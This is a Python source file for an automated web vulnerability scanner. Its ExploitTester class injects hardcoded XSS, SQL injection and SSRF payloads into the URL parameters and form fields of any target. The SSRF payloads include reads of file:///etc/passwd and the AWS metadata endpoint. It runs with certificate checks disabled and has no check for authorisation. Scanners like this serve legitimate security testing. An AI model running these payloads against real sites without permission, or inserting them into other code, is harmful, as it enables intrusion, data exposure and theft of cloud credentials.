import requests
import logging
from typing import Dict, List
import re
from bs4 import BeautifulSoup
import urllib.parse
import concurrent.futures
from dataclasses import dataclass
from requests.exceptions import RequestException

@dataclass
class ExploitResult:
    vulnerable: bool
    payload: str
    evidence: str = ""
    error: str = ""

class ExploitTester:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)"
        ]
        self.sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "admin' --",
            "' OR 1=1--",
            "')) OR 1=1--"
        ]
        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://127.0.0.1:8080"
        ]

    def _format_url(self, url: str) -> str:
        """Format URL correctly"""
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        return url

    def test_xss_exploitation(self, url: str) -> Dict:
        """Test for XSS vulnerabilities"""
        url = self._format_url(url)
        results = {
            "vulnerable": False,
            "tested_params": [],
            "successful_payloads": [],
            "evidence": []
        }

        try:
            # Get the page and find all forms and parameters
            response = requests.get(url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            # Test URL parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param in params:
                results["tested_params"].append({"type": "url", "name": param})
                for payload in self.xss_payloads:
                    test_url = self._inject_url_payload(url, param, payload)
                    try:
                        test_response = requests.get(test_url, verify=False, timeout=5)
                        if payload in test_response.text:
                            results["vulnerable"] = True
                            results["successful_payloads"].append({
                                "payload": payload,
                                "param": param,
                                "type": "url"
                            })
                    except RequestException as e:
                        self.logger.debug(f"XSS test error: {e}")

            # Test forms
            for form in forms:
                form_inputs = form.find_all(['input', 'textarea'])
                for input_field in form_inputs:
                    field_name = input_field.get('name', '')
                    if field_name:
                        results["tested_params"].append({"type": "form", "name": field_name})
                        for payload in self.xss_payloads:
                            try:
                                data = {field_name: payload}
                                if form.get('method', 'get').lower() == 'post':
                                    test_response = requests.post(url, data=data, verify=False, timeout=5)
                                else:
                                    test_response = requests.get(url, params=data, verify=False, timeout=5)
                                
                                if payload in test_response.text:
                                    results["vulnerable"] = True
                                    results["successful_payloads"].append({
                                        "payload": payload,
                                        "param": field_name,
                                        "type": "form"
                                    })
                            except RequestException as e:
                                self.logger.debug(f"XSS form test error: {e}")

        except Exception as e:
            self.logger.error(f"XSS testing error: {e}")
            results["error"] = str(e)

        return results

    def test_sqli_exploitation(self, url: str) -> Dict:
        """Test for SQL injection vulnerabilities"""
        url = self._format_url(url)
        results = {
            "vulnerable": False,
            "tested_params": [],
            "successful_payloads": [],
            "evidence": []
        }

        try:
            # Test URL parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param in params:
                results["tested_params"].append({"type": "url", "name": param})
                for payload in self.sqli_payloads:
                    test_url = self._inject_url_payload(url, param, payload)
                    try:
                        test_response = requests.get(test_url, verify=False, timeout=5)
                        if self._check_sqli_response(test_response):
                            results["vulnerable"] = True
                            results["successful_payloads"].append({
                                "payload": payload,
                                "param": param,
                                "type": "url"
                            })
                    except RequestException as e:
                        self.logger.debug(f"SQLi test error: {e}")

        except Exception as e:
            self.logger.error(f"SQLi testing error: {e}")
            results["error"] = str(e)

        return results

    def test_ssrf_exploitation(self, url: str) -> Dict:
        """Test for SSRF vulnerabilities"""
        url = self._format_url(url)
        results = {
            "vulnerable": False,
            "tested_params": [],
            "successful_payloads": [],
            "evidence": []
        }

        try:
            # Find parameters that might accept URLs
            response = requests.get(url, verify=False, timeout=10)
            url_params = re.findall(r'[?&](url|link|src|href|path|document|file)=([^&]+)', 
                                  response.text)
            
            for param_name, _ in url_params:
                results["tested_params"].append({"type": "url", "name": param_name})
                for payload in self.ssrf_payloads:
                    test_url = self._inject_url_payload(url, param_name, payload)
                    try:
                        test_response = requests.get(test_url, verify=False, timeout=5)
                        if self._check_ssrf_response(test_response):
                            results["vulnerable"] = True
                            results["successful_payloads"].append({
                                "payload": payload,
                                "param": param_name,
                                "type": "url"
                            })
                    except RequestException as e:
                        self.logger.debug(f"SSRF test error: {e}")

        except Exception as e:
            self.logger.error(f"SSRF testing error: {e}")
            results["error"] = str(e)

        return results

    def _inject_url_payload(self, url: str, param: str, payload: str) -> str:
        """Helper to inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def _check_sqli_response(self, response) -> bool:
        """Check if response indicates successful SQL injection"""
        indicators = [
            'SQL syntax',
            'mysql_fetch_array()',
            'ORA-01756',
            'SQLite3::query()',
            'System.Data.SQLClient'
        ]
        return any(indicator in response.text for indicator in indicators)

    def _check_ssrf_response(self, response) -> bool:
        """Check if response indicates successful SSRF"""
        indicators = [
            'root:x:',  # /etc/passwd content
            '<title>Dashboard</title>',  # Internal dashboard
            'ami-id',  # AWS metadata
            'instance-id'
        ]
        return any(indicator in response.text for indicator in indicators)

    def run_all_tests(self, url: str) -> Dict:
        """Run all exploit tests"""
        url = self._format_url(url)
        all_results = {}
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                xss_future = executor.submit(self.test_xss_exploitation, url)
                sqli_future = executor.submit(self.test_sqli_exploitation, url)
                ssrf_future = executor.submit(self.test_ssrf_exploitation, url)

                all_results["xss_exploitation"] = xss_future.result()
                all_results["sqli_exploitation"] = sqli_future.result()
                all_results["ssrf_exploitation"] = ssrf_future.result()

        except Exception as e:
            self.logger.error(f"Error running exploit tests: {e}")
            all_results = {
                "xss_exploitation": {"error": str(e), "vulnerable": False},
                "sqli_exploitation": {"error": str(e), "vulnerable": False},
                "ssrf_exploitation": {"error": str(e), "vulnerable": False}
            }

        return all_results 